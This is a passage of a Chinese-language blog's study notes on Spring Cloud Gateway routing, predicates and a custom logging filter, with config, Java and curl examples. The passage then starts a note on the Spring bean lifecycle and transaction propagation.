class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">cloud-gateway-service</span></span><br><span class="line">  <span class="attr">client:</span> <span class="comment">#服务提供者provider注册进eureka服务列表内</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure><p>4.主启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.netflix.eureka.EnableEurekaClient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GateWayMain9527</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(GateWayMain9527<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.9527网关如何做路由映射</p><p>cloud-provider-payment8001看看controller的访问地址</p><ul><li>get</li><li>lb</li></ul><p>我们目前不想暴露8001端口，希望在8001外面套一层9527</p><p>6.YML新增网关配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line"><span class="comment">#############################新增网关配置###########################</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh</span> <span class="comment">#payment_route    #路由的ID，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span>          <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="comment">#uri: lb://cloud-payment-service #匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/get/**</span>         <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh2</span> <span class="comment">#payment_route    #路由的ID，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span>          <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="comment">#uri: lb://cloud-payment-service #匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/lb/**</span>         <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line"><span class="comment">####################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">cloud-gateway-service</span></span><br><span class="line">  <span class="attr">client:</span> <span class="comment">#服务提供者provider注册进eureka服务列表内</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure><p>8.测试</p><ul><li><p>启动7001</p></li><li><p>启动8001-cloud-provider-payment8001</p></li><li><p>启动9527网关</p></li></ul><p>访问说明</p><ul><li>添加网关前 - <a href="http://localhost:8001/payment/get/1" target="_blank" rel="noopener">http://localhost:8001/payment/get/1</a></li><li>添加网关后 - <a href="http://localhost:9527/payment/get/1" target="_blank" rel="noopener">http://localhost:9527/payment/get/1</a></li></ul><h3 id="Gateway配置路由的两种方式"><a href="#Gateway配置路由的两种方式" class="headerlink" title="Gateway配置路由的两种方式"></a>Gateway配置路由的两种方式</h3><p>1.配置文件.yml、.properties配置</p><p>2.lamda表达式，<strong>代码中注入RouteLocator的Bean</strong></p><p>官方案例[<a href="https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/#modifying-the-way-remote-addresses-are-resolved" target="_blank" rel="noopener">https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/#modifying-the-way-remote-addresses-are-resolved</a>]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">RemoteAddressResolver resolver = XForwardedRemoteAddressResolver</span><br><span class="line">    .maxTrustedIndex(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.route(<span class="string">"direct-route"</span>,</span><br><span class="line">    r -&gt; r.remoteAddr(<span class="string">"10.1.1.1"</span>, <span class="string">"10.10.1.1/24"</span>)</span><br><span class="line">        .uri(<span class="string">"https://downstream1"</span>)</span><br><span class="line">.route(<span class="string">"proxied-route"</span>,</span><br><span class="line">    r -&gt; r.remoteAddr(resolver, <span class="string">"10.10.1.1"</span>, <span class="string">"10.10.1.1/24"</span>)</span><br><span class="line">        .uri(<span class="string">"https://downstream2"</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="GateWay配置动态路由"><a href="#GateWay配置动态路由" class="headerlink" title="GateWay配置动态路由"></a>GateWay配置动态路由</h3><p>默认情况下Gateway会根据注册中心注册的服务列表，以注册中心上微服务名为路径创建<strong>动态路由进行转发，从而实现动态路由的功能</strong>（不写死一个地址）。</p><p><strong>启动</strong></p><ul><li>eureka7001</li><li>payment8001/8002</li></ul><p>需要注意的是uri的协议为lb，表示启用Gateway的负载均衡功能。</p><p>lb://serviceName是spring cloud gateway在微服务中自动为我们创建的负载均衡uri。</p><p>配置文件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line"><span class="comment">#############################新增网关配置###########################</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">locator:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment">#开启从注册中心动态创建路由的功能，利用微服务名进行路由</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh</span> <span class="comment">#payment_route    #路由的ID，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line">          <span class="comment">#uri: http://localhost:8001          #匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://cloud-payment-service</span> <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/get/**</span>         <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh2</span> <span class="comment">#payment_route    #路由的ID，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line">          <span class="comment">#uri: http://localhost:8001          #匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://cloud-payment-service</span> <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/lb/**</span>         <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line"><span class="comment">####################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">cloud-gateway-service</span></span><br><span class="line">  <span class="attr">client:</span> <span class="comment">#服务提供者provider注册进eureka服务列表内</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure><p><strong>测试</strong></p><p>浏览器输入 - <a href="http://localhost:9527/payment/lb" target="_blank" rel="noopener">http://localhost:9527/payment/lb</a></p><p>结果</p><p>不停刷新页面，8001/8002两个端口切换。</p><h3 id="GateWay常用的Predicate"><a href="#GateWay常用的Predicate" class="headerlink" title="GateWay常用的Predicate"></a>GateWay常用的Predicate</h3><p>官方文档[<a href="https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/#gateway-request-predicates-factories" target="_blank" rel="noopener">https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/#gateway-request-predicates-factories</a>]</p><p>Route Predicate Factories这个是什么</p><blockquote><p>Spring Cloud Gateway matches routes as part of the Spring WebFlux HandlerMapping infrastructure. Spring Cloud Gateway includes many built-in route predicate factories. All of these predicates match on different attributes of the HTTP request. You can combine multiple route predicate factories with logical and statements. link[<a href="https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/#gateway-request-predicates-factories" target="_blank" rel="noopener">https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/#gateway-request-predicates-factories</a>]</p></blockquote><p>Spring Cloud Gateway将路由匹配作为Spring WebFlux HandlerMapping基础架构的一部分。</p><p>Spring Cloud Gateway包括许多内置的Route Predicate工厂。所有这些Predicate都与HTTP请求的不同属性匹配。多个RoutePredicate工厂可以进行组合。</p><p>Spring Cloud Gateway创建Route 对象时，使用RoutePredicateFactory 创建 Predicate对象，Predicate 对象可以赋值给Route。Spring Cloud Gateway包含许多内置的Route Predicate Factories。<br>所有这些谓词都匹配HTTP请求的不同属性。多种谓词工厂可以组合，并通过逻辑and。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">predicate</span><br><span class="line"></span><br><span class="line">美: [<span class="string">'predɪkeɪt] 英: ['</span>predɪkət]</span><br><span class="line"></span><br><span class="line">v. 断言；使基于；使以…为依据；表明</span><br><span class="line"></span><br><span class="line">adj. 述语的；谓项的</span><br><span class="line"></span><br><span class="line">n. 谓语（句子成分，对主语加以陈述，如 John went home 中的 went home）</span><br></pre></td></tr></table></figure><p><strong>常用的Route Predicate Factory</strong></p><p>1.The After Route Predicate Factory<br>2.The Before Route Predicate Factory<br>3.The Between Route Predicate Factory<br>4.The Cookie Route Predicate Factory<br>5.The Header Route Predicate Factory<br>6.The Host Route Predicate Factory<br>7.The Method Route Predicate Factory<br>8.The Path Route Predicate Factory<br>9.The Query Route Predicate Factory<br>10.The RemoteAddr Route Predicate Factory<br>11.The weight Route Predicate Factory</p><p><strong>讨论几个Route Predicate Factory</strong></p><p>The After Route Predicate Factory</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">after_route</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">https://example.org</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="comment"># 这个时间后才能起效</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">After=2017-01-20T17:42:47.789-07:00[America/Denver]</span></span><br></pre></td></tr></table></figure><p>可以通过下述方法获得上述格式的时间戳字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.time.ZonedDateTime;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ZonedDateTime zbj = ZonedDateTime.now(); <span class="comment">// 默认时区</span></span><br><span class="line">        System.out.println(zbj);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//2021-02-22T15:51:37.485+08:00[Asia/Shanghai]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>The Between Route Predicate Factory</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">cookie_route</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">https://example.org</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Cookie=chocolate,</span> <span class="string">chip</span></span><br></pre></td></tr></table></figure><p>The cookie route predicate factory takes two parameters, the cookie name and a regular expression.</p><p>This predicate matches cookies that have the given name and whose values match the regular expression.</p><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 该命令相当于发get请求，且没带cookie</span><br><span class="line">curl http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lb</span><br><span class="line"></span><br><span class="line"># 带cookie的</span><br><span class="line">curl http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lb --cookie &quot;chocolate&#x3D;chip&quot;</span><br></pre></td></tr></table></figure><p><strong>The Header Route Predicate Factory</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">header_route</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">https://example.org</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Header=X-Request-Id,</span> <span class="string">\d+</span></span><br></pre></td></tr></table></figure><p>The header route predicate factory takes two parameters, the header name and a regular expression.</p><p>This predicate matches with a header that has the given name whose value matches the regular expression.</p><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 带指定请求头的参数的CURL命令</span><br><span class="line">curl http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lb -H &quot;X-Request-Id:123&quot;</span><br></pre></td></tr></table></figure><p><strong>小结</strong></p><p>说白了，Predicate就是为了实现一组匹配规则，让请求过来找到对应的Route进行处理。</p><h3 id="GateWay的Filter"><a href="#GateWay的Filter" class="headerlink" title="GateWay的Filter"></a>GateWay的Filter</h3><p>官方文档[<a href="https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/#gatewayfilter-factories" target="_blank" rel="noopener">https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/#gatewayfilter-factories</a>]</p><blockquote><p>Route filters allow the modification of the incoming HTTP request or outgoing HTTP response in some manner. Route filters are scoped to a particular route. Spring Cloud Gateway includes many built-in GatewayFilter Factories.</p></blockquote><p>路由过滤器可用于修改进入的HTTP请求和返回的HTTP响应，路由过滤器只能指定路由进行使用。Spring Cloud Gateway内置了多种路由过滤器，他们都由GatewayFilter的工厂类来产生。</p><p>Spring Cloud Gateway的Filter:</p><ul><li><p>生命周期：</p><ul><li>pre</li><li>post</li></ul></li><li><p>种类（具体看官方文档）：</p><ul><li>GatewayFilter - 有31种</li><li>GlobalFilter - 有10种</li></ul></li></ul><p>常用的GatewayFilter：AddRequestParameter GatewayFilter</p><p>自定义全局GlobalFilter：</p><p>两个主要接口介绍：</p><ul><li>GlobalFilter</li><li>Ordered</li></ul><p>能干什么：</p><ul><li>全局日志记录</li><li>统一网关鉴权</li><li>…</li></ul><p>自定义过滤器Filter 实现GlobalFilter,Ordered接口</p><p>代码案例：</p><p>GateWay9527项目添加MyLogGateWayFilter类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLogGateWayFilter</span> <span class="keyword">implements</span> <span class="title">GlobalFilter</span>,<span class="title">Ordered</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        log.info(<span class="string">"***********come in MyLogGateWayFilter:  "</span>+<span class="keyword">new</span> Date());</span><br><span class="line"></span><br><span class="line">        String uname = exchange.getRequest().getQueryParams().getFirst(<span class="string">"uname"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(uname == <span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            log.info(<span class="string">"*******用户名为null，非法用户，o(╥﹏╥)o"</span>);</span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.NOT_ACCEPTABLE);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getOrder</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><p>启动：</p><ul><li><p>EurekaMain7001</p></li><li><p>PaymentMain8001</p></li><li><p>GateWayMain9527</p></li><li><p>PaymentMain8002</p></li></ul><p>浏览器输入：</p><p><a href="http://localhost:9527/payment/lb" target="_blank" rel="noopener">http://localhost:9527/payment/lb</a> - 反问异常<br><a href="http://localhost:9527/payment/lb?uname=abc" target="_blank" rel="noopener">http://localhost:9527/payment/lb?uname=abc</a> - 正常反问</p>]]></content>
      
      
      
        <tags>
            
            <tag> spring cloud </tag>
            
            <tag> GateWay </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring</title>
      <link href="/2021/07/18/spring/"/>
      <url>/2021/07/18/spring/</url>
      
        <content type="html"><![CDATA[<h3 id="SpringBean的生命周期"><a href="#SpringBean的生命周期" class="headerlink" title="SpringBean的生命周期"></a>SpringBean的生命周期</h3><p><img src="../img/spring/spring生命周期.png" alt=""></p><p>spirng根据类实例化对象后，对加了@Autowired、@Resource注解的属性进行赋值(属性填充)、进行对象初始化(@PostConstruct注解)、判断是否需要AOP(配置控制)需要的话AOP生成代理对象、代理对象注册成bean</p><p>spring 单例bean，bean按照type和name获取，spring有类似于map的结构存储bean，key为bean的name,value为bean,spring中该类似于map的容器叫单例缓存池。</p><p><img src="../img/spring/spring获取bean.png" alt=""></p><p>获取流程  byType ——&gt;根据Type从Spring容器里找到多个Bean———&gt;查看bean是否(@autoWireCandidate = false过滤掉)————&gt;是不是符合Qualifier（@Qualifier（”name”））分组——-&gt;取@Primary标注了的bean——-&gt;取优先级最高的Bean————&gt;根据属性名字选出一个</p><p>@Autowire  spring提供</p><p>bytype 再byName</p><p>@Resource  java提供</p><p>byName找不到再 byType</p><h3 id="Spring事务"><a href="#Spring事务" class="headerlink" title="Spring事务"></a>Spring事务</h3><p>开启事务相关注解:</p><p>@Configuration</p><p>@EnableTransactionManagement</p><p>@Transaction</p><h4 id="Spring事务传播机制"><a href="#Spring事务传播机制" class="headerlink" title="Spring事务传播机制"></a>Spring事务传播机制</h4><h4 id="spring事务传播的含义"><a href="#spring事务传播的含义" class="headerlink" title="spring事务传播的含义"></a>spring事务传播的含义</h4><p>简单的理解就是多个事务方法相互调用时,事务如何在这些方法间传播。默认是REQUIRED。</p><h4 id="7种事务传播类型"><a href="#7种事务传播类型" class="headerlink" title="7种事务传播类型"></a>7种事务传播类型</h4><p>按对当前事务的支持情况7种传播类型可分为三组</p><p>支持当前事务类型:</p><p>1 <strong>REQUIRED</strong> 